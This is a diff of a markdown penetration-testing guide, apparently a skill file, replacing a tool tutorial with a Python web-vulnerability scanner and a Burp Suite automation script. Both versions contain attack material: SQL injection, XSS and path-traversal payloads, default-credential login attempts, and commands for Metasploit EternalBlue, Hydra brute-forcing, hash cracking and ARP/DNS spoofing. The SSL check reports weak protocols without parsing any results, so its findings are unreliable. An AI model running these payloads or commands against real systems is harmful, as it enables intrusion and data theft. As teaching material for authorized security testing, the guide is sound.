@@ -1,786 +1,536 @@
 ---
-name: Penetration Testing
-description: Simulated cyberattacks on systems to identify vulnerabilities before malicious attackers do, including ethical hacking, vulnerability assessment, and security testing with explicit permission.
+name: penetration-testing
+description: Ethical hacking and security testing methodologies using penetration testing tools, exploit frameworks, and manual security validation. Use when assessing application security posture and identifying exploitable vulnerabilities.
 ---
 
 # Penetration Testing
 
-> **Current Level:** Advanced  
-> **Domain:** Security / Testing
-
----
-
 ## Overview
 
-Penetration testing (pen testing) is a simulated cyberattack on your systems to identify vulnerabilities before malicious attackers do. It's ethical hacking with explicit permission. Effective penetration testing includes planning, reconnaissance, exploitation, reporting, and remediation verification.
-
-## What is Penetration Testing
-
-### Pen Testing Goals
-
-| Goal | Description |
-|-------|-------------|
-| **Identify Vulnerabilities** | Find security weaknesses |
-| **Assess Risk** | Determine potential impact |
-| **Validate Controls** | Test security measures |
-| **Prioritize Fixes** | Guide remediation efforts |
-| **Compliance** | Meet regulatory requirements |
-
-### Why Pen Testing Matters
-
-| Benefit | Impact |
-|---------|---------|
-| **Find vulnerabilities first** | Before attackers do |
-| **Test real-world scenarios** | Simulate actual attacks |
-| **Validate security investments** | Confirm controls work |
-| **Meet compliance** | PCI DSS, SOC2, etc. |
-| **Reduce breach risk** | Proactive security |
-
-## Types of Pen Tests
-
-### Black Box Testing
-
-**Definition**: No prior knowledge of systems
-
-| Pros | Cons |
-|-------|-------|
-| Realistic attack simulation | Time-consuming |
-| Tests discovery | May miss deep vulnerabilities |
-| No bias | Less comprehensive |
-
-**Use Case**: External penetration test
-
-### White Box Testing
-
-**Definition**: Full knowledge of systems (code, architecture)
-
-| Pros | Cons |
-|-------|-------|
-| Comprehensive | Not realistic |
-| Fast | May miss discovery issues |
-| Finds deep issues | Requires access |
-
-**Use Case**: Internal code review
-
-### Gray Box Testing
-
-**Definition**: Partial knowledge (some access, some info)
-
-| Pros | Cons |
-|-------|-------|
-| Balanced approach | Requires coordination |
-| More realistic than white box | Less comprehensive |
-
-**Use Case**: Most common pen test type
-
-## Pen Testing Phases
-
-### The Pen Testing Lifecycle
-
-```
-┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
-│Reconnaissance│───▶│  Scanning   │───▶│Exploitation│───▶│Maintaining  │───▶│  Reporting   │
-│             │    │             │    │             │    │  Access     │    │             │
-│ Gather info  │    │ Identify    │    │ Exploit     │    │ Keep access │    │ Document    │
-│ on target    │    │ vulnerable  │    │ vulns       │    │ for further  │    │ findings    │
-│             │    │ services    │    │             │    │ exploration │    │             │
-└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
-```
-
-## Reconnaissance
-
-### Passive Reconnaissance
-
-Gather information without direct interaction.
-
-| Technique | Tools | What It Finds |
-|-------------|--------|----------------|
-| **Google dorking** | Google | Exposed files, admin panels |
-| **WHOIS** | whois, DomainTools | Domain registration info |
-| **DNS enumeration** | nslookup, dig | Subdomains, DNS records |
-| **Shodan** | Shodan | Exposed services |
-| **Social media** | OSINT tools | Employee information |
-
-### Active Reconnaissance
-
-Interact with target to gather information.
-
-| Technique | Tools | What It Finds |
-|-------------|--------|----------------|
-| **Port scanning** | Nmap | Open ports, services |
-| **Service enumeration** | Nmap, Nikto | Service versions |
-| **Web crawling** | Burp, ZAP | Website structure |
-| **Directory brute force** | DirBuster, Gobuster | Hidden directories |
-
-### Reconnaissance Example
-
-```bash
-# Port scanning
-nmap -sV -sC -p- 10.0.0.1
-
-# Subdomain enumeration
-subfinder -d example.com
-
-# Web crawling
-gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
-
-# Shodan search
-shodan search "org:Example Corp"
-```
-
-## Scanning
-
-### Port Scanning
-
-**Nmap Commands**:
-
-```bash
-# Basic scan
-nmap target.com
-
-# Service version detection
-nmap -sV target.com
-
-# OS detection
-nmap -O target.com
-
-# Aggressive scan
-nmap -A target.com
-
-# Scan specific ports
-nmap -p 80,443,22 target.com
-
-# Scan all ports
-nmap -p- target.com
-
-# Output formats
-nmap -oN output.txt target.com
-nmap -oX output.xml target.com
-```
-
-### Vulnerability Scanning
-
-| Tool | Type | What It Finds |
-|-------|-------|----------------|
-| **Nessus** | Commercial | Known vulnerabilities |
-| **OpenVAS** | Open-source | Known vulnerabilities |
-| **Nikto** | Web scanner | Web server vulnerabilities |
-| **SQLMap** | SQL injection | SQL injection vulnerabilities |
-
-### Scanning Example
-
-```bash
-# Vulnerability scan with Nessus
-nessus -i targets.txt -o results.xml
-
-# Web vulnerability scan with Nikto
-nikto -h https://example.com
-
-# SQL injection scan with SQLMap
-sqlmap -u "https://example.com/page?id=1"
-```
-
-## Exploitation
-
-### Exploit Tools
-
-| Tool | Type | Use Case |
-|-------|-------|----------|
-| **Metasploit** | Exploitation framework | Known exploits |
-| **Burp Suite** | Web application testing | Manual exploitation |
-| **SQLMap** | SQL injection | Database exploitation |
-| **Hydra** | Password cracking | Brute force attacks |
-
-### Exploitation Example
-
-```bash
-# Use Metasploit
-msfconsole
-search type:exploit platform:windows
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOST 10.0.0.1
-exploit
-
-# SQL injection with SQLMap
-sqlmap -u "https://example.com/page?id=1" --dbs
-
-# Password cracking with Hydra
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1
-```
-
-## Common Targets
-
-### Web Applications
-
-| Vulnerability | Tool |
-|---------------|-------|
-| **SQL injection** | SQLMap, Burp |
-| **XSS** | Burp, XSSer |
-| **CSRF** | Burp, CSRFTester |
-| **Authentication bypass** | Burp, OWASP ZAP |
-| **File upload** | Burp, OWASP ZAP |
-
-### Network Infrastructure
-
-| Vulnerability | Tool |
-|---------------|-------|
-| **Unpatched services** | Nmap, Nessus |
-| **Weak credentials** | Hydra, Medusa |
-| **Misconfigured firewall** | Nmap, tcpdump |
-| **Default credentials** | Nmap, Metasploit |
-
-### APIs
-
-| Vulnerability | Tool |
-|---------------|-------|
-| **Broken authentication** | Burp, Postman |
-| **Excessive data exposure** | Burp, OWASP ZAP |
-| **Lack of rate limiting** | JMeter, OWASP ZAP |
-| **Injection flaws** | SQLMap, Burp |
-
-### Mobile Apps
-
-| Vulnerability | Tool |
-|---------------|-------|
-| **Insecure storage** | MobSF, Frida |
-| **Weak encryption** | MobSF, Frida |
-| **Insecure communication** | Burp, Wireshark |
-| **Code tampering** | Frida, Xposed |
-
-## Tools
-
-### Kali Linux
-
-Penetration testing distribution with pre-installed tools.
-
-**Categories**:
-- Information gathering
-- Vulnerability assessment
-- Web application analysis
-- Exploitation tools
-- Password attacks
-- Sniffing/spoofing
-
-### Nmap
-
-**Port scanning**:
-
-```bash
-# Scan all ports
-nmap -p- target.com
-
-# Scan with scripts
-nmap --script vuln target.com
-
-# Scan UDP
-nmap -sU target.com
-```
-
-### Metasploit
-
-**Exploitation framework**:
-
-```bash
-# Start console
-msfconsole
-
-# Search exploits
-search type:exploit
-
-# Use exploit
-use exploit/windows/smb/ms17_010_eternalblue
-
-# Set options
-set RHOST 10.0.0.1
-set LHOST 10.0.0.2
-
-# Exploit
-exploit
-
-# Sessions
-sessions -l
-```
-
-### Burp Suite
-
-**Web application testing**:
-
-1. **Proxy**: Intercept and modify requests
-2. **Repeater**: Modify and resend requests
-3. **Intruder**: Automate attacks
-4. **Scanner**: Find vulnerabilities
-5. **Repeater**: Test payloads
-
-### Wireshark
-
-**Network analysis**:
-
-```bash
-# Capture traffic
-wireshark -i eth0
-
-# Filter by IP
-ip.addr == 10.0.0.1
-
-# Filter by protocol
-http or dns
-
-# Filter by port
-tcp.port == 80
-```
-
-### John the Ripper
-
-**Password cracking**:
-
-```bash
-# Crack password hashes
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-
-# Show cracked passwords
-john --show hashes.txt
-```
-
-## Web App Testing
-
-### SQL Injection
-
-**Testing**:
-
-```bash
-# Test for SQL injection
-sqlmap -u "https://example.com/page?id=1"
-
-# Enumerate databases
-sqlmap -u "https://example.com/page?id=1" --dbs
-
-# Dump tables
-sqlmap -u "https://example.com/page?id=1" -D database --tables
-
-# Dump columns
-sqlmap -u "https://example.com/page?id=1" -D database -T table --columns
+Systematic security testing to identify, exploit, and document vulnerabilities in applications, networks, and infrastructure through simulated attacks.
+
+## When to Use
+
+- Pre-production security validation
+- Annual security assessments
+- Compliance requirements (PCI-DSS, ISO 27001)
+- Post-incident security review
+- Third-party security audits
+- Red team exercises
+
+## Implementation Examples
+
+### 1. **Automated Penetration Testing Framework**
+
+```python
+# pentest_framework.py
+import requests
+import socket
+import subprocess
+import json
+from typing import List, Dict
+from dataclasses import dataclass, asdict
+from datetime import datetime
+
+@dataclass
+class Finding:
+    severity: str
+    category: str
+    target: str
+    vulnerability: str
+    evidence: str
+    remediation: str
+    cvss_score: float
+
+class PenetrationTester:
+    def __init__(self, target: str):
+        self.target = target
+        self.findings: List[Finding] = []
+
+    def test_sql_injection(self, url: str) -> None:
+        """Test for SQL injection vulnerabilities"""
+        print(f"Testing SQL injection on {url}")
+
+        payloads = [
+            "' OR '1'='1",
+            "'; DROP TABLE users--",
+            "' UNION SELECT NULL, NULL, NULL--",
+            "1' AND 1=1--",
+            "admin'--"
+        ]
+
+        for payload in payloads:
+            try:
+                response = requests.get(
+                    url,
+                    params={'id': payload},
+                    timeout=5
+                )
+
+                # Check for SQL errors
+                sql_errors = [
+                    'mysql_fetch_array',
+                    'SQLServer JDBC Driver',
+                    'ORA-01756',
+                    'PostgreSQL',
+                    'sqlite3.OperationalError'
+                ]
+
+                for error in sql_errors:
+                    if error in response.text:
+                        self.findings.append(Finding(
+                            severity='critical',
+                            category='SQL Injection',
+                            target=url,
+                            vulnerability=f'SQL Injection detected with payload: {payload}',
+                            evidence=f'Error message: {error}',
+                            remediation='Use parameterized queries or prepared statements',
+                            cvss_score=9.8
+                        ))
+                        break
+
+            except Exception as e:
+                print(f"Error testing {url}: {e}")
+
+    def test_xss(self, url: str) -> None:
+        """Test for Cross-Site Scripting vulnerabilities"""
+        print(f"Testing XSS on {url}")
+
+        payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<svg onload=alert('XSS')>",
+            "'-alert('XSS')-'"
+        ]
+
+        for payload in payloads:
+            try:
+                response = requests.get(
+                    url,
+                    params={'q': payload},
+                    timeout=5
+                )
+
+                if payload in response.text:
+                    self.findings.append(Finding(
+                        severity='high',
+                        category='Cross-Site Scripting',
+                        target=url,
+                        vulnerability=f'Reflected XSS detected with payload: {payload}',
+                        evidence='Payload reflected in response without sanitization',
+                        remediation='Implement output encoding and Content Security Policy',
+                        cvss_score=7.3
+                    ))
+                    break
+
+            except Exception as e:
+                print(f"Error testing {url}: {e}")
+
+    def test_authentication(self, login_url: str) -> None:
+        """Test authentication mechanisms"""
+        print(f"Testing authentication on {login_url}")
+
+        # Test default credentials
+        default_creds = [
+            ('admin', 'admin'),
+            ('admin', 'password'),
+            ('root', 'root'),
+            ('administrator', 'administrator')
+        ]
+
+        for username, password in default_creds:
+            try:
+                response = requests.post(
+                    login_url,
+                    data={'username': username, 'password': password},
+                    timeout=5
+                )
+
+                if response.status_code == 200 and 'dashboard' in response.text.lower():
+                    self.findings.append(Finding(
+                        severity='critical',
+                        category='Weak Authentication',
+                        target=login_url,
+                        vulnerability=f'Default credentials accepted: {username}/{password}',
+                        evidence='Successful authentication with default credentials',
+                        remediation='Enforce strong password policy and remove default accounts',
+                        cvss_score=9.1
+                    ))
+
+            except Exception as e:
+                print(f"Error testing credentials: {e}")
+
+    def test_security_headers(self, url: str) -> None:
+        """Test for missing security headers"""
+        print(f"Testing security headers on {url}")
+
+        try:
+            response = requests.get(url, timeout=5)
+
+            critical_headers = {
+                'Strict-Transport-Security': 'HSTS not implemented',
+                'X-Frame-Options': 'Clickjacking protection missing',
+                'X-Content-Type-Options': 'MIME sniffing prevention missing',
+                'Content-Security-Policy': 'CSP not implemented',
+                'X-XSS-Protection': 'XSS protection header missing'
+            }
+
+            for header, description in critical_headers.items():
+                if header not in response.headers:
+                    self.findings.append(Finding(
+                        severity='medium',
+                        category='Missing Security Header',
+                        target=url,
+                        vulnerability=f'Missing header: {header}',
+                        evidence=description,
+                        remediation=f'Add {header} header to all responses',
+                        cvss_score=5.3
+                    ))
+
+        except Exception as e:
+            print(f"Error testing headers: {e}")
+
+    def test_directory_traversal(self, url: str) -> None:
+        """Test for directory traversal vulnerabilities"""
+        print(f"Testing directory traversal on {url}")
+
+        payloads = [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+            '....//....//....//etc/passwd',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+        ]
+
+        for payload in payloads:
+            try:
+                response = requests.get(
+                    url,
+                    params={'file': payload},
+                    timeout=5
+                )
+
+                # Check for Unix passwd file
+                if 'root:' in response.text or 'daemon:' in response.text:
+                    self.findings.append(Finding(
+                        severity='critical',
+                        category='Directory Traversal',
+                        target=url,
+                        vulnerability=f'Path traversal detected with payload: {payload}',
+                        evidence='System file contents exposed',
+                        remediation='Validate and sanitize file paths, use whitelist approach',
+                        cvss_score=8.6
+                    ))
+                    break
+
+            except Exception as e:
+                print(f"Error testing traversal: {e}")
+
+    def test_ssl_tls(self) -> None:
+        """Test SSL/TLS configuration"""
+        print(f"Testing SSL/TLS on {self.target}")
+
+        try:
+            result = subprocess.run(
+                ['testssl.sh', '--jsonfile', 'ssl-results.json', self.target],
+                capture_output=True,
+                text=True,
+                timeout=60
+            )
+
+            # Parse SSL test results
+            # This is a simplified check
+            weak_protocols = ['SSLv2', 'SSLv3', 'TLSv1.0']
+            for protocol in weak_protocols:
+                self.findings.append(Finding(
+                    severity='high',
+                    category='Weak SSL/TLS',
+                    target=self.target,
+                    vulnerability=f'Weak protocol enabled: {protocol}',
+                    evidence='Outdated SSL/TLS protocol support',
+                    remediation='Disable weak protocols, enforce TLS 1.2+',
+                    cvss_score=7.5
+                ))
+
+        except Exception as e:
+            print(f"SSL test error: {e}")
+
+    def run_full_pentest(self, target_urls: List[str]) -> Dict:
+        """Execute comprehensive penetration test"""
+        for url in target_urls:
+            self.test_sql_injection(url)
+            self.test_xss(url)
+            self.test_security_headers(url)
+            self.test_directory_traversal(url)
+
+        self.test_ssl_tls()
+
+        return self.generate_report()
+
+    def generate_report(self) -> Dict:
+        """Generate comprehensive pentest report"""
+        summary = {
+            'critical': 0,
+            'high': 0,
+            'medium': 0,
+            'low': 0
+        }
+
+        for finding in self.findings:
+            if finding.severity in summary:
+                summary[finding.severity] += 1
+
+        report = {
+            'timestamp': datetime.now().isoformat(),
+            'target': self.target,
+            'total_findings': len(self.findings),
+            'summary': summary,
+            'findings': [asdict(f) for f in self.findings],
+            'risk_score': self._calculate_risk_score(),
+            'recommendations': self._generate_recommendations()
+        }
+
+        with open('pentest-report.json', 'w') as f:
+            json.dump(report, f, indent=2)
+
+        return report
+
+    def _calculate_risk_score(self) -> float:
+        """Calculate overall risk score"""
+        if not self.findings:
+            return 0.0
+
+        total_cvss = sum(f.cvss_score for f in self.findings)
+        return round(total_cvss / len(self.findings), 2)
+
+    def _generate_recommendations(self) -> List[str]:
+        """Generate prioritized recommendations"""
+        recommendations = []
+
+        categories = {}
+        for finding in self.findings:
+            if finding.category not in categories:
+                categories[finding.category] = []
+            categories[finding.category].append(finding)
+
+        for category, findings in sorted(
+            categories.items(),
+            key=lambda x: len(x[1]),
+            reverse=True
+        ):
+            recommendations.append(
+                f"Address {len(findings)} {category} vulnerabilities"
+            )
+
+        return recommendations[:5]
+
+# Usage
+if __name__ == '__main__':
+    tester = PenetrationTester('https://example.com')
+
+    target_urls = [
+        'https://example.com/api/users',
+        'https://example.com/search',
+        'https://example.com/download'
+    ]
+
+    report = tester.run_full_pentest(target_urls)
+
+    print("\n=== Penetration Test Report ===")
+    print(f"Target: {report['target']}")
+    print(f"Total Findings: {report['total_findings']}")
+    print(f"Risk Score: {report['risk_score']}")
+    print(f"\nFindings by Severity:")
+    print(f"  Critical: {report['summary']['critical']}")
+    print(f"  High: {report['summary']['high']}")
+    print(f"  Medium: {report['summary']['medium']}")
+    print(f"  Low: {report['summary']['low']}")
 ```
 
-### XSS Testing
+### 2. **Burp Suite Automation Script**
 
-**Testing**:
-
-```bash
-# Test for XSS
-xsser -u "https://example.com/page?param=value"
-
-# Manual testing
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
-```
-
-### CSRF Testing
-
-**Testing**:
-
-```bash
-# Generate CSRF PoC with Burp
-# Use CSRFTester
-# Check for anti-CSRF tokens
-```
-
-## Network Testing
-
-### Firewall Bypass
-
-**Techniques**:
-- Port knocking
-- Firewall evasion
-- Fragmentation
-
-### Man-in-the-Middle
-
-**Tools**: Ettercap, Bettercap
-
-```bash
-# ARP spoofing with Ettercap
-ettercap -T arp -i eth0 -M /gateway_ip/ /target_ip/
-```
-
-### DNS Poisoning
-
-**Tools**: DNSChef, dnsspoof
-
-```bash
-# DNS spoofing with dnsspoof
-dnsspoof -i eth0 -f /etc/hosts
-```
-
-## Reporting
-
-### Report Structure
-
-1. **Executive Summary**
-   - High-level findings
-   - Risk assessment
-   - Recommendations
-
-2. **Methodology**
-   - Scope
-   - Tools used
-   - Testing approach
-
-3. **Findings**
-   - Vulnerability details
-   - Evidence
-   - Impact assessment
-
-4. **Recommendations**
-   - Prioritized fixes
-   - Remediation steps
-
-5. **Appendices**
-   - Detailed technical info
-   - Screenshots
-   - Logs
-
-### Risk Rating
-
-| Rating | Description | Example |
-|--------|-------------|---------|
-| **Critical** | Immediate action required | Remote code execution |
-| **High** | Important to fix | SQL injection |
-| **Medium** | Should fix | XSS |
-| **Low** | Nice to fix | Information disclosure |
-
-### Finding Template
-
-```
-# Finding: SQL Injection in Login Form
-
-**Severity**: Critical
-
-**Description**:
-The login form is vulnerable to SQL injection, allowing attackers to bypass authentication and access the database.
-
-**Evidence**:
-Payload: ' OR '1'='1
-Response: Login successful
-
-**Impact**:
-- Unauthorized database access
-- Data exfiltration
-- Potential complete system compromise
-
-**Recommendation**:
-Use parameterized queries to prevent SQL injection.
-
-**Remediation**:
 ```javascript
-// Vulnerable code
-const query = `SELECT * FROM users WHERE username = '${username}'`;
+// burp-automation.js - Node.js Burp Suite integration
+const axios = require('axios');
+const fs = require('fs').promises;
 
-// Fixed code
-const query = 'SELECT * FROM users WHERE username = $1';
-await db.query(query, [username]);
-```
-```
+class BurpSuiteAutomation {
+  constructor(burpApiUrl = 'http://127.0.0.1:1337') {
+    this.apiUrl = burpApiUrl;
+    this.taskId = null;
+  }
 
-## Pen Test Frequency
+  async startScan(targetUrl) {
+    console.log(`Starting Burp scan for ${targetUrl}`);
 
-| Organization Type | Frequency |
-|------------------|-----------|
-| **High security** | Quarterly |
-| **Medium security** | Semi-annually |
-| **Low security** | Annually |
-| **After major changes** | Immediately |
+    const scanConfig = {
+      urls: [targetUrl],
+      scan_configurations: [
+        {
+          name: 'Crawl and Audit - Lightweight',
+          type: 'NamedConfiguration'
+        }
+      ]
+    };
 
-### Compliance Requirements
+    try {
+      const response = await axios.post(
+        `${this.apiUrl}/v0.1/scan`,
+        scanConfig
+      );
 
-| Regulation | Requirement |
-|------------|-------------|
-| **PCI DSS** | Annual pen test + quarterly ASV scan |
-| **SOC2** | Annual pen test |
-| **HIPAA** | Risk assessment (pen test recommended) |
-| **ISO 27001** | Regular security testing |
+      this.taskId = response.data.task_id;
+      console.log(`Scan started with task ID: ${this.taskId}`);
 
-## In-House vs Outsourced
+      return this.taskId;
+    } catch (error) {
+      console.error('Failed to start scan:', error.message);
+      throw error;
+    }
+  }
 
-| Aspect | In-House | Outsourced |
-|--------|------------|-------------|
-| **Cost** | Lower | Higher |
-| **Expertise** | Limited | Broad |
-| **Perspective** | Biased | Unbiased |
-| **Tools** | Limited | Comprehensive |
-| **Certification** | May not have | Certified |
+  async getScanStatus() {
+    if (!this.taskId) {
+      throw new Error('No active scan task');
+    }
 
-### When to Use Each
+    const response = await axios.get(
+      `${this.apiUrl}/v0.1/scan/${this.taskId}`
+    );
 
-| Situation | Approach |
-|-----------|-----------|
-| **Regular testing** | In-house |
-| **Compliance** | Outsourced (certified) |
-| **Specialized testing** | Outsourced |
-| **Continuous testing** | In-house + automated |
+    return {
+      taskId: this.taskId,
+      status: response.data.scan_status,
+      metrics: response.data.scan_metrics
+    };
+  }
 
-## Bug Bounty Programs
+  async waitForCompletion() {
+    console.log('Waiting for scan to complete...');
 
-### Crowdsourced Security Testing
+    while (true) {
+      const status = await this.getScanStatus();
 
-**Benefits**:
-- Continuous testing
-- Global talent pool
-- Pay for valid vulnerabilities
-- White-hat engagement
+      console.log(`Progress: ${status.metrics.crawl_requests_made} requests`);
 
-### Platforms
+      if (status.status === 'succeeded') {
+        console.log('Scan completed successfully');
+        break;
+      } else if (status.status === 'failed') {
+        throw new Error('Scan failed');
+      }
 
-| Platform | Description |
-|-----------|-------------|
-| **HackerOne** | Largest bug bounty platform |
-| **Bugcrowd** | Enterprise-focused |
-| **Intigriti** | High-quality researchers |
-| **YesWeHack** | European platform |
+      await new Promise(resolve => setTimeout(resolve, 10000));
+    }
+  }
 
-### Bounty Structure
+  async getIssues() {
+    if (!this.taskId) {
+      throw new Error('No active scan task');
+    }
 
-| Severity | Typical Bounty |
-|----------|----------------|
-| **Critical** | $10,000+ |
-| **High** | $1,000 - $10,000 |
-| **Medium** | $100 - $1,000 |
-| **Low** | $50 - $100 |
+    const response = await axios.get(
+      `${this.apiUrl}/v0.1/scan/${this.taskId}/issues`
+    );
 
-### Program Setup
+    return response.data.issues;
+  }
 
-**Components**:
-- Scope (what's in/out)
-- Rules of engagement
-- Bounty amounts
-- Disclosure policy
-- Safe harbor
+  async generateReport() {
+    const issues = await this.getIssues();
 
-## Legal and Ethical
+    const report = {
+      summary: {
+        high: 0,
+        medium: 0,
+        low: 0,
+        info: 0
+      },
+      issues: []
+    };
 
-### Always Get Permission
+    for (const issue of issues) {
+      report.summary[issue.severity.toLowerCase()]++;
 
-**Required**:
-- Written authorization
-- Defined scope
-- Rules of engagement
-- Non-disclosure agreement
+      report.issues.push({
+        severity: issue.severity,
+        confidence: issue.confidence,
+        name: issue.name,
+        path: issue.path,
+        description: issue.description,
+        remediation: issue.remediation
+      });
+    }
 
-### Scope Definition
+    await fs.writeFile(
+      'burp-report.json',
+      JSON.stringify(report, null, 2)
+    );
 
-| In Scope | Out of Scope |
-|-----------|--------------|
-| `example.com` | `example.org` |
-| `api.example.com` | Third-party services |
-| Mobile app | Physical security |
-| Employee accounts | Social engineering |
+    return report;
+  }
+}
 
-### Rules of Engagement
+// Usage
+async function runBurpScan() {
+  const burp = new BurpSuiteAutomation();
 
-1. **No disruption** | Don't impact production |
-2. **No data exfiltration** | Don't steal data |
-3. **Report findings** | Report all vulnerabilities |
-4. **Respect privacy** | Don't access personal data |
-5. **Stop if asked** | Stop immediately if requested |
+  await burp.startScan('https://example.com');
+  await burp.waitForCompletion();
 
-### Non-Disclosure Agreement
+  const report = await burp.generateReport();
 
-**Key Points**:
-- Confidentiality of findings
-- No disclosure without permission
-- Return all data after test
-- No use of findings for other purposes
+  console.log('\n=== Burp Suite Scan Results ===');
+  console.log(`High: ${report.summary.high}`);
+  console.log(`Medium: ${report.summary.medium}`);
+  console.log(`Low: ${report.summary.low}`);
+}
 
-## Real Pen Test Scenarios
-
-### Scenario 1: Web App Security Assessment
-
-**Target**: E-commerce website
-
-**Approach**:
-1. Reconnaissance: Gather info about site
-2. Scanning: Identify technologies, vulnerabilities
-3. Testing: Test for OWASP Top 10
-4. Exploitation: Attempt to exploit vulnerabilities
-5. Reporting: Document findings and recommendations
-
-**Findings**:
-- SQL injection in search
-- XSS in product reviews
-- CSRF in checkout
-- Broken access control in user profiles
-
-### Scenario 2: Network Infrastructure Test
-
-**Target**: Corporate network
-
-**Approach**:
-1. Reconnaissance: Identify network range
-2. Scanning: Find open ports, services
-3. Exploitation: Attempt to exploit services
-4. Lateral movement: Move within network
-5. Reporting: Document findings
-
-**Findings**:
-- Unpatched Windows server
-- Default credentials on router
-- Misconfigured firewall
-- Weak SMB configuration
-
-### Scenario 3: Cloud Security Review
-
-**Target**: AWS infrastructure
-
-**Approach**:
-1. Reconnaissance: Identify AWS resources
-2. Scanning: Check for misconfigurations
-3. Testing: Test IAM permissions, S3 buckets
-4. Exploitation: Attempt to access resources
-5. Reporting: Document findings
-
-**Findings**:
-- Publicly accessible S3 bucket
-- Overly permissive IAM role
-- Unencrypted EBS volumes
-- Security groups allow 0.0.0.0/0
-
-## Summary Checklist
-
-### Before Pen Test
-
-- [ ] Written authorization obtained
-- [ ] Scope defined
-- [ ] Rules of engagement agreed
-- [ ] NDA signed
-- [ ] Tools prepared
-
-### During Pen Test
-
-- [ ] Stay within scope
-- [ ] Document all findings
-- [ ] Preserve evidence
-- [ ] Report issues immediately
-- [ ] Stop if asked
+runBurpScan().catch(console.error);
 ```
 
----
+## Best Practices
 
-## Quick Start
+### ✅ DO
+- Get written authorization
+- Define clear scope
+- Use controlled environments
+- Document all findings
+- Follow responsible disclosure
+- Provide remediation guidance
+- Verify fixes after patching
+- Maintain chain of custody
 
-### Penetration Testing Tools
+### ❌ DON'T
+- Test production without approval
+- Cause service disruption
+- Exfiltrate sensitive data
+- Share findings publicly
+- Exceed authorized scope
+- Use destructive payloads
 
-```bash
-# OWASP ZAP
-docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target-app.com
+## Penetration Testing Phases
 
-# Nmap scan
-nmap -sV -sC target.com
+1. **Reconnaissance**: Information gathering
+2. **Scanning**: Vulnerability identification
+3. **Exploitation**: Proof of concept
+4. **Post-Exploitation**: Assess impact
+5. **Reporting**: Document findings
+6. **Remediation**: Assist with fixes
 
-# Burp Suite
-# Use Burp Suite for manual testing
-```
+## Common Tools
 
-### Vulnerability Reporting
+- **Burp Suite**: Web application testing
+- **OWASP ZAP**: Free security scanner
+- **Metasploit**: Exploitation framework
+- **Nmap**: Network scanning
+- **SQLMap**: SQL injection testing
+- **testssl.sh**: SSL/TLS testing
+- **Nikto**: Web server scanner
 
-```markdown
-# Vulnerability Report
-
-## Summary
-[Brief description]
-
-## Severity
-[Critical/High/Medium/Low]
-
-## Description
-[Detailed description]
-
-## Impact
-[Potential impact]
-
-## Steps to Reproduce
-1. Step 1
-2. Step 2
-
-## Remediation
-[How to fix]
-
-## References
-[CVEs, OWASP, etc.]
-```
-
----
-
-## Production Checklist
-
-- [ ] **Scope Definition**: Define testing scope
-- [ ] **Authorization**: Written authorization obtained
-- [ ] **Tools**: Penetration testing tools prepared
-- [ ] **Team**: Penetration testing team assembled
-- [ ] **Documentation**: Document all findings
-- [ ] **Reporting**: Comprehensive vulnerability report
-- [ ] **Remediation**: Remediation recommendations
-- [ ] **Verification**: Verify fixes after remediation
-- [ ] **Compliance**: Meet compliance requirements
-- [ ] **Regular Testing**: Schedule regular pen tests
-- [ ] **Documentation**: Document pen test process
-- [ ] **Training**: Team security training
-
----
-
-## Anti-patterns
-
-### ❌ Don't: No Authorization
-
-```markdown
-# ❌ Bad - No authorization
-"Let me test this system"
-# Unauthorized access!
-```
-
-```markdown
-# ✅ Good - Written authorization
-Authorization letter signed by:
-- CTO
-- Security team
-- Legal team
-Scope clearly defined
-```
-
-### ❌ Don't: Out of Scope
-
-```markdown
-# ❌ Bad - Out of scope
-Scope: Web application
-Action: Tested production database
-# Beyond scope!
-```
-
-```markdown
-# ✅ Good - Stay in scope
-Scope: Web application
-Action: Tested only web application
-# Within scope
-```
-
----
-
-## Integration Points
-
-- **Vulnerability Management** (`24-security-practices/vulnerability-management/`) - Vulnerability handling
-- **Security Audit** (`24-security-practices/security-audit/`) - Security reviews
-- **OWASP Top 10** (`24-security-practices/owasp-top-10/`) - Common vulnerabilities
-
----
-
-## Further Reading
+## Resources
 
 - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [PTES Methodology](http://www.pentest-standard.org/)
-
-### After Pen Test
-
-- [ ] Complete report written
-- [ ] Findings presented
-- [ ] Recommendations provided
-- [ ] Evidence returned
-- [ ] Follow-up scheduled
+- [PTES Technical Guidelines](http://www.pentest-standard.org/)
+- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
+- [Metasploit Unleashed](https://www.metasploitunleashed.com/)
